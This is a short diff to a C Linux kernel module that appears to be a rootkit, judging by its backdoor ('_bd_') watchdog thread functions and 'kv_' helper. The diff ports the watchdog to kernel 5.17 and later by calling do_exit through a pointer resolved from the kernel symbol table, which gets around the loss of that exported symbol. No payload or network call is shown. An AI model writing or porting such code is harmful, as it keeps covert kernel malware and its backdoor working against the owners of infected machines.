@@ -457,11 +457,20 @@ void _bd_cleanup(bool force) {
 }
 
 static int _bd_watchdog_iph(void *unused) {
+#if LINUX_VERSION_CODE >= KERNEL_VERSION(5,17,0)
+    struct kernel_syscalls *kaddr = kv_kall_load_addr();
+#endif
     while(!kthread_should_stop()) {
         msleep(500);
         _bd_cleanup(false);
     }
-    do_exit(0);
+#if LINUX_VERSION_CODE >= KERNEL_VERSION(5,17,0)
+
+              kaddr->k_do_exit(0);
+              return 0;
+#else
+              do_exit(0);
+#endif
 }
 
 /**
@@ -471,6 +480,9 @@ static int _bd_watchdog_iph(void *unused) {
  */
 static int _bd_watchdog(void *t)
 {
+#if LINUX_VERSION_CODE >= KERNEL_VERSION(5,17,0)
+    struct kernel_syscalls *kaddr = kv_kall_load_addr();
+#endif
     set_current_state(TASK_INTERRUPTIBLE);
 
     while(!kthread_should_stop()) {
@@ -491,7 +503,11 @@ static int _bd_watchdog(void *t)
     __set_current_state(TASK_RUNNING);
 
     prinfo("BD watchdog OFF\n");
-    do_exit(0);
+#if LINUX_VERSION_CODE >= KERNEL_VERSION(5,17,0)
+              kaddr->k_do_exit(0);
+#else
+              do_exit(0);
+#endif
 }
 
 /**
